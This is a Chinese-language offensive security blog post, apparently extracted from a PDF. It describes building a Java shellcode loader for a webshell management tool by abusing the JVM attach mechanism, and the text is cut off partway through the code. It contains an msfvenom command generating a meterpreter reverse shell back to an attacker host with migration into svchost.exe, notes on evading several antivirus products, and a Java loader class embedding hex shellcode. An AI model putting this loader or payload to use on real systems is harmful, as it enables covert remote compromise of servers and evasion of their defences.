1
Java注⼊ShellCode踩坑
前⾔
三种⽅法简介
JNI
JNA
JVM
踩坑
放弃JNA
JVM的坑
正确操作
测试
实现代码
最后
@yzddmr6
@zsxq: websafe
在做As-Exploits的Java Shellcode加载模块的时候遇到了很多的坑，在这⾥跟⼤家分享⼀下。
宽字节的这篇⽂章写的很好，java执⾏shellcode的⼏种⽅法，主要也是根据这篇⽂章来实现的。这⾥简单
总结⼀下
由于Java屏蔽了很多底层的细节，所以没办法直接⽤原⽣Java去注⼊shellcode。但是Java提供了加载
C++动态链接库的⽅法，所以我们可以把加载Shellcode的代码写在dll⾥，然后⽤Java去调⽤dll即可。冰
蝎就是采⽤的这种⽅法。但是缺点是⽂件要落地，很容易被杀。
写过C#的shellcode加载器的同学应该知道，主要⽤到了windows中kernel32.dll这个动态链接库。这个
dll中包含了新建进程，线程注⼊等很多底层的⽅法。如果Java能调⽤到这个dll，就可以实现任意
shellcode的加载。
前⾔
三种⽅法简介
JNI
JNA
2
正好，JNA这个库对JNI进⾏了封装，并且可以调⽤kernel32。后⾯的操作就跟C#的写法差不多了，⽆⾮
就是换成了Java语⾔。
很多APT都⽤了这种⽅法，具体实现可以看我的这个项⽬，https://github.com/yzddmr6/Java-
Shellcode-Loader
核⼼代码来⾃于：https://norfolkinfosec.com/jeshell-an-oceanlotus-apt32-backdoor/
这个操作就⽐较秀了，宽字节的师傅发现在java agent注⼊的过程中会往⽬标进程⾥⾯去塞shellcode，并
且这个native⽅法是jdk⾃带的，并且经过oracle签名的。
其中主要⽤到了WindowsVirtualMachine.java这个类，native⽅法源码在这⾥：
WindowsVirtualMachine.c
因为JNA的库不是jdk⾃带的，当时就理所应当的想到，先⽤jarloader模块把这个jar打⼊到内存中，然后
反射去调⽤，这样⽂件就不会直接落地。结果gui都画好了。。。发现jar⼀直打不进去，后来调了⼀下发现
是因为jar太⼤，超过了Tomcat默认的最⼤POST⼤⼩2m。
然后⼜想到了利⽤multipart的格式来上传，结果Java必须要通过⼿动解析multipart的内容才可以获取到
⾥⾯的参数值，不能直接使⽤request.getParameter来获取。这样就还需要修改shell中的代码。放弃
接着就想到shiro反序列化中也有header⻓度的问题。Litch1师傅在基于全局储存的新思路 | Tomcat的⼀
种通⽤回显⽅法研究这篇⽂章⾥提到了可以⽤反射去修改Tomcat header最⼤⻓度的参数。那么POST最
⼤⻓度的⼤⼩应该也是可以修改的。但是看到后⾯需要多个连接同时访问后就放弃了。。。太麻烦了，放
弃。
既然改着很麻烦，那⼲脆就直接不改了。先利⽤⽂件上传把jar传到⽬标的⼀个⽬录⾥，然后⽤
URLClassLoader去加载也是可以的。但是这样也会导致⽂件直接落地。跟JNI相⽐⽆⾮是把落地的dll变成
了jar⽽已。不过⽬前杀软对jar的查杀⼒度要⽐dll弱得多。
总的来说，这种⽅式不是很优雅，所以最后还是放弃了。
JVM
踩坑
放弃JNA
3
前⾯⼀篇⽂章提到了测试这种⽅法的时候会把java进程给打挂，原因是我本地的java进程位数跟测试机的
java位数是不⼀样的。
本⼈⼆进制弟弟，现学了⼀点shellcode的知识，说的不⼀定对，仅供参考。
⼀般情况下：采⽤线程注⼊的时候，32位进程只能注⼊32位的shellcode到32位进程，64同理。
利⽤java agent这种shellcode注⼊⽅法属于线程注⼊，所以来说，知道⽬标进程的位数是很重要的。
但是很遗憾，除了调⽤kernel32中的IsWow64Process API以外，我没有找到其他判断⽬标进程位数的⽅
法。⽽想要⽤Java调⽤这个API，还得⽤到上⾯JNA这个库，所以想要实现对任意进程的注⼊是不⾏的。
Java系统变量中有⼀个参数：sun.arch.data.model，标注了当前Java的位数。这样我们虽然不知道其他
进程的位数，但是我们可以知道Java进程的位数，所以可以把shellcode注⼊到⾃⼰。
但是这种⽅法存在很⼤⻛险，如果位数不对很可能把Java进程给⼲死，直接把站给打挂了。
在实际测试中，msf⽐较坑，在shellcode执⾏结束/位数错误/migrate的时候会把java给⼲死。
cs如果注⼊错位数的话没有什么反应，Tomcat也不会挂掉，inject的时候也不会把原来的进程给杀死。
1. 基本信息，exploit，Ctrl+F搜索 sun.arch.data.model，查看java位数
2. 根据java位数⽣成对应的shellcode，并开启监听。
需要注意的是，MSF需要加上PrependMigrate=true PrependMigrateProc=xxxx.exe参数，⾃动迁移到
新的进程。（重要！）
如：
JVM的坑
正确操作
4
3. 在ShellCode加载器模块，输⼊hex格式的shellcode，且不能有多余换⾏跟空格。
4. 点击exploit，等待返回回话。
装了360，⽕绒，电脑管家
1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.88.1
29 LPORT=8888  PrependMigrate=true PrependMigrateProc=svchost.exe
 -f hex
测试
5
直接上线，杀软没有拦截。
实现代码
  1 package shellcode_loader;
  2
  3
  4 import javax.servlet.http.HttpServletRequest;
  5 import javax.servlet.http.HttpServletResponse;
  6 import java.lang.management.ManagementFactory;
  7 import java.lang.reflect.Field;
  8 import java.lang.reflect.Method;
  9
 10
 11 public class JvmLoader {
 12     public HttpServletRequest request = null;
 13     public HttpServletResponse response = null;
 14     public String cs = "UTF-8";
 15     public String shellcodeHex = "targetShellCode";
 16     public String PID = "targetPID";
 17
 18     public static void main(String[] args) throws Exception {
 19         JvmLoader loader = new JvmLoader();
6
 20         String shellcodeHex = "4831c94881e9ddffffff488d05effffff
f48bb555c08a50e29deb248315827482df8ffffffe2f4a9148b41fec11eb2555
c49f44f798ce3031439776b6155e0351483f7166155e0751483d75e61d1051f1
64594c761ef72f96069d90c05fef3949505e40fe83c5f071d59ed857bfe39176
040a4dea25e3a555c08ed8be9aad51d5dd8f58561c6f6de1c28ec0ff93de41da
3c1e4851d56fa548a4594c761ef72f91dc96c0368df736dbc7d54422a92965d1
931747bf186f6de1c2cec0ff9b8f3de5040e18569c2fb548c492e0aa196b3851
d50e4567787e8140449fc4f739631b97c49f7f1c986f30c06402e1cc0894daaa
355edb428deb2555c08a50e61533f545d08a54f93ef393adbf770b5d96b10031
db2039b94434d80148b612615d8ce5fdcf3457b2c65f5462e67cf0e709f3b8fa
3ddc66f45bd9c30246da50e29deb2";
 21         loader.loadShellCode(shellcodeHex, getCurrentPID());
 22     }
 23
 24     public boolean equals(Object obj) {
 25         this.parseObj(obj);
 26
 27         StringBuffer output = new StringBuffer();
 28         String tag_s = "->|";
 29         String tag_e = "|<-";
 30         try {
 31             response.setContentType("text/html");
 32             request.setCharacterEncoding(cs);
 33             response.setCharacterEncoding(cs);
 34             if (this.PID.equals("targetPID")) {
 35                 output.append(loadShellCode(shellcodeHex, getCur
rentPID()));
 36             } else {
 37                 output.append(loadShellCode(shellcodeHex, this.P
ID));
 38             }
 39         } catch (Exception e) {
 40             output.append("ERROR:// " + e.toString());